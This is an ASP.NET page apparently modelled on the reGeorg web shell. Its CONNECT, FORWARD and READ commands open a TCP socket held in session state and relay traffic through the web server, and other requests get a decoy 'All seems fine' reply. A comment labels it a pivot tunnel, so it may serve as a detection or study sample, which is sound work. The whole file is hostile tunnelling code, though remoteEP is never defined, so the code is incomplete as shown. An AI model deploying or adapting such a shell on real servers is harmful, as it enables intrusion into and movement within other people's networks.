<%@ Page Language="C#" EnableSessionState="True"%>
<%@ Import Namespace="System.Net.Sockets" %>
<%
// Minimal reGeorg-shaped tunnel page: CONNECT opens a TCP socket parked in
// session state, FORWARD pipes the request body into it, READ streams socket
// output back with BinaryWrite. Any page doing this is a pivot tunnel.
    String cmd = Request.QueryString.Get("cmd").ToUpper();
    if (cmd == "CONNECT")
    {
        Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        sender.Connect(remoteEP);
        Session.Add("socket", sender);
    }
    else if (cmd == "FORWARD")
    {
        Socket s = (Socket)Session["socket"];
        byte[] buff = new byte[Request.ContentLength];
        Request.InputStream.Read(buff, 0, buff.Length);
        s.Send(buff);
    }
    else if (cmd == "READ")
    {
        Socket s = (Socket)Session["socket"];
        byte[] readBuff = new byte[512];
        int c = s.Receive(readBuff);
        Response.BinaryWrite(readBuff);
    }
    else
    {
        Response.Write("Georg says, 'All seems fine'");
    }
%>
